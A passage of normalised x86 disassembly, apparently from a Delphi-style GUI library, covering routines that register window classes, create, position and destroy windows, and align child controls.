mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44f53c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44f56b ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44f5f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44fde8
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418778
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4188d4
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44f1b4
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44fdac
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_418950
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_4188d4
mov edx eax
mov ecx ebx
mov eax edi
call sub_44f128
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_44f764
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_44fde8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44fdac
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44fdac
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_44f7b8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_44f764
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f897
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44f5f4
pop ecx
push ebp
mov al 0x2
call sub_44f5f4
pop ecx
push ebp
mov al 0x3
call sub_44f5f4
pop ecx
push ebp
mov al 0x4
call sub_44f5f4
pop ecx
push ebp
mov al 0x5
call sub_44f5f4
pop ecx
push ebp
mov al 0x6
call sub_44f5f4
pop ecx
push ebp
xor eax eax
call sub_44f5f4
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_4034a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_44f8bc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4533bc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_44f943
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44f980
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fa45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44c278
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fa4c
mov eax [ ebp - 0xc ]
call sub_4032a8
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418778
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44bfbc
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4188d4
xor ecx ecx
mov edx 0xb03e
call sub_44da78
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_44fa54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fde8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44f950
xor edx edx
push ebp
push sub_44fb3b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418778
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_4188d4
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44fdac
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_44bd60
mov dl 0x4
call sub_44bd60
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_4187c4
sub_44fba8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_464294
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_467fb8
sub_44fbc8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44b140
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44b140
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44b140
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_44fc14
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44b168
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44b168
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44b168
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_44fc5c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4034a4
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44da78
mov edx ebx
mov eax edi
call sub_44fbc8
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44da78
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44da78
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
call sub_4533bc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44da78
mov eax edi
call sub_4507ac
jmp r-xdata
mov edx ebx
mov eax edi
call sub_44f8bc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44fd30
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44da78
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44fba8
mov eax ebp
call sub_450610
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44fc14
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44da78
mov eax esi
call sub_44f978
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ccbc
sub_44fdac
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4188d4
mov edx edi
mov eax ebp
call sub_4188d4
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44fe08
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_44fde8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44fdac
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44fe48
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44fe08
add esp 0x10
retn
sub_44fe70
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44fedc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44cf08
test al al
je r-xdata
mov eax ebx
call sub_44cf38
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_4034a4
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4034a4
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4034a4
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44ff44
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_450062
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402cbc
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44fedc
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4530b8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031f8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40429c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450069
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_450070
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_450231
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_4495e8
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_4495e8
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cf94
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cf94
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408c8c
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_4533c8
push 0x1
mov eax [ esi + 0x68 ]
call sub_4244b8
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44da78
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4530b8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450238
lea eax [ ebp - 0xc0 ]
call sub_404038
retn
mov eax esi
mov si 0xffee
call sub_4034a4
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_450240
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d68
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_450280
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d24c
mov eax esi
call sub_41d19c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41d19c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41d254
pop esi
pop ebx
retn
sub_4502b8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41f480
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f3b4
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f3b4
mov eax esi
call sub_41f488
add esp 0x10
pop esi
pop ebx
retn
sub_450320
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_45030c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4188d4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4188d4
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4503f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44ddb0
mov eax [ ebp - 0x8 ]
push eax
push sub_450280
mov eax [ ebp - 0x8 ]
push eax
push sub_4502b8
push ebp
call sub_450320
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450454
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44c7e8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408c40
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408c54
mov ecx eax
mov edx edi
mov eax ebx
call sub_44c7f8
mov eax r-xdata
call sub_408c60
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44b274
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_4504ac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4504f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450500
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cf94
sub_450510
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_418930
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4188d4
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_450558
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_450510
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44fdac
call sub_44bea0
inc edi
dec esi
jne r-xdata
sub_4505f4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
